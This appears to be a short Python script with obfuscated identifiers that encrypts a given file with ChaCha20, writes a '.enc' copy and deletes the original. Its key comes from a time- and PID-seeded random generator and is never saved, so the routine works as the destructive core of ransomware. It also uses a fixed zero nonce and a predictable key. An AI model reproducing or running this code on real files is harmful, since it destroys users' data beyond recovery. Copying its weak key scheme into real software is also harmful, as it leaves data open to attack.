#!/usr/bin/env python3
import os, random, time
from Crypto.Cipher import ChaCha20

def _0x1a2b():
    _0x3c4d = int(time.time())
    _0x5e6f = os.getpid()
    _0x7g8h = (_0x3c4d * 1000) + (_0x5e6f % 1000)
    random.seed(_0x7g8h)
    return bytes([random.randint(0, 255) for _ in range(32)])

def _0x9i10(_0x11j12):
    with open(_0x11j12, 'rb') as _0xf: _0x13k14 = _0xf.read()
    _0x15l16 = ChaCha20.new(key=_0x1a2b(), nonce=b'\x00'*12)
    _0x17m18 = _0x15l16.encrypt(_0x13k14)
    with open(_0x11j12 + ".enc", 'wb') as _0xf: _0xf.write(_0x17m18)
    os.remove(_0x11j12)


